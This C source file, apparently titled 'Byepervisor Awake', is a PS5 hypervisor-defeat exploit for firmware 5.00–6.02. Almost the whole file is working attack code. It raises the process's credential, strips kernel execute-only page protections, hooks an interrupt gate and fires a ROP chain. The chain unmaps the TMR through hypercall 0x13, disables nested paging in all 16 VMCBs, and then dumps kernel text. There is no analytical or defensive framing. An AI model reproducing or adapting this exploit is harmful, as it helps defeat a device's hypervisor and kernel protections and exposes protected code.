/*
 * Byepervisor Awake — PS5 HV defeat for FW 5.00–6.02
 */
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"
#include "paging.h"

#define HV_DEFEAT_MARK  0xcafedead00001337ULL
#define HOOK_IST        6
#define TSS_STRIDE      0x68
#define K_DELTA         0xC60000
#define CAVE_DIAG_OFF   0x700
#define HOOK_CORE       1

// HV constants for FW 6.02
#define VMCB_BASE_PA    0x62A57000ULL
#define VMCB_STRIDE     0x2000ULL
#define GMET_ENABLE     0x8ULL
#define TMR_ID          9365

// FUN_HV_UNMAP_PT_TMR — from ps5-linux-loader off_0602
// Kernel vmmcall wrapper for hypercall 0x13
#define HC13_OFF        0xBC3690

uint64_t g_hv_base_pa;

int main(void)
{
  uint32_t fw;
  uint64_t cave, dmap;
  uint64_t kernel_pmap;
  uint64_t pde_addr, pte_addr, pde, pte;

  {int one=1;setsockopt(1,IPPROTO_TCP,TCP_NODELAY,&one,sizeof(one));}
  printf("[+] Byepervisor Awake\n");

  fw = kernel_get_fw_version();
  printf("[+] FW: %x.%x\n", (fw >> 24) & 0xFF, (fw >> 16) & 0xFF);
  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) return 0;

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  dmap = kdldmap(0);

  // Check if already defeated
  uint64_t prev = kread64(cave + CAVE_DIAG_OFF);
  printf("[PREV] diag=0x%lx\n", prev);
  if (prev == HV_DEFEAT_MARK) {
    printf("[+] *** HV ALREADY DEFEATED ***\n");
    kHexDump(ktext(0), 0x20);
    uint8_t kb[16];
    kread(ktext(0), kb, 16);
    notifyf("Byepervisor Awake\n[HV DEFEATED] FW %x.%02x\n"
            "%02x%02x%02x%02x %02x%02x%02x%02x\n"
            "%02x%02x%02x%02x %02x%02x%02x%02x",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF,
            kb[0],kb[1],kb[2],kb[3],kb[4],kb[5],kb[6],kb[7],
            kb[8],kb[9],kb[10],kb[11],kb[12],kb[13],kb[14],kb[15]);
    return 0;
  }

  // Pin to CPU1 — HC 0x13 operates on calling vCPU's VMCB only
  pin_to_core(HOOK_CORE);

  // Disable guest xotext (needed for post-defeat ktext access)
  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  for (uint64_t addr = ktext(0); addr < ktext(0) + K_DELTA; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT); SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }
    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT); SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }
  printf("[+] xotext disabled\n");

  // Build ROP chain: unmap TMR → write VMCBs → reload
  printf("[+] Building chain\n");
  {
    khook_t hook;
    kh_chain_t chain;
    uint8_t chain_buf[0x800];
    int ret;

    ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
    if (ret) { printf("[!] kh_init: %d\n", ret); return ret; }
    hook.tss_stride = TSS_STRIDE;
    kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
    kh_set_core(&hook, HOOK_CORE);
    hook.oneshot = 1;
    kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));

    kh_chain_init(&chain, chain_buf, sizeof chain_buf);

    // Stage 1: chain started marker
    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE01DE01DE01DE01ULL);

    // Stage 2: hv_unmap_pt_tmr — removes TMR for this vCPU
    // HV handler zeros VMCB[current_vCPU]+0x5F8, ignoring guest args
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(&chain, TMR_ID);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RSI);
    kh_chain_q(&chain, 0x1000);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(&chain, 0);
    kh_chain_q(&chain, ktext(HC13_OFF));

    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE02DE02DE02DE02ULL);

    // Stage 3: DMAP write GMET_ENABLE to all 16 VMCBs (disables NPT)
    for (int i = 0; i < 16; i++) {
      kh_chain_store(&chain, dmap + VMCB_BASE_PA + (uint64_t)i * VMCB_STRIDE + 0x90,
                     GMET_ENABLE);
    }

    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, 0xDE03DE03DE03DE03ULL);

    // Stage 4: vmmcall reload — HV re-reads modified VMCBs
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDI);
    kh_chain_q(&chain, 0);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RSI);
    kh_chain_q(&chain, 0);
    kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
    kh_chain_q(&chain, 0xFFFFFFFFFFFFFFFFULL);
    kh_chain_q(&chain, ktext(HC13_OFF));

    // Final: defeat marker
    kh_chain_store(&chain, cave + CAVE_DIAG_OFF, HV_DEFEAT_MARK);

    if (chain.err) { printf("[!] chain overflow\n"); return -1; }

    kwrite64(cave + CAVE_DIAG_OFF, 0);

    ret = kh_install(&hook, &chain);
    if (ret) { printf("[!] kh_install: %d\n", ret); return ret; }

    printf("[+] Firing\n");
    fflush(stdout);
    kh_trigger(&hook);

    // Restore IDT/IST
    uint64_t idt = kdlsym(KERNEL_SYM_IDT_ARRAY);
    uint64_t tss = kdlsym(KERNEL_SYM_COMMON_TSS);
    kwrite64(idt + 16,     hook.saved_gate_lo);
    kwrite64(idt + 16 + 8, hook.saved_gate_hi);
    kwrite64(tss + (uint64_t)HOOK_CORE * TSS_STRIDE + (0x24 + HOOK_IST * 8),
             hook.saved_ist);
  }

  sceKernelSleep(1);
  uint64_t diag = kread64(cave + CAVE_DIAG_OFF);
  printf("[+] diag=0x%lx\n", diag);

  if (diag == HV_DEFEAT_MARK) {
    printf("[+] *** HV DEFEATED! ***\n");
    kHexDump(ktext(0), 0x20);
    uint8_t kb[16];
    kread(ktext(0), kb, 16);
    notifyf("Byepervisor Awake\n[HV DEFEATED] FW %x.%02x\n"
            "%02x%02x%02x%02x %02x%02x%02x%02x\n"
            "%02x%02x%02x%02x %02x%02x%02x%02x",
            (fw >> 24) & 0xFF, (fw >> 16) & 0xFF,
            kb[0],kb[1],kb[2],kb[3],kb[4],kb[5],kb[6],kb[7],
            kb[8],kb[9],kb[10],kb[11],kb[12],kb[13],kb[14],kb[15]);
  } else {
    printf("[!] Failed (diag=0x%lx)\n", diag);
  }

  return 0;
}
